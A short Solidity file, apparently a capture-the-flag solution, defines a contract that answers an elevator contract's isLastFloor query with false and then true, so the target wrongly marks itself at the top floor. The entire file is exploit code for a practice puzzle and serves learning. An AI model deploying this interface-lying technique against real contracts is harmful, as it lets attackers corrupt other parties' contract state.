// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MyBuilding {
    AbstractElevator elevator;

    constructor(address _elevator) {
        elevator = AbstractElevator(_elevator);
    }

    function isLastFloor(uint _floor) public view returns (bool){
        uint floor = elevator.floor();
        if (floor != _floor) {
            return false;
        }
        return true;
    }

    function changeFloor(uint _floor) public {
        elevator.goTo(_floor);
    }
}

abstract contract AbstractElevator {
    bool public top;
    uint public floor;

    function goTo(uint) virtual public;
}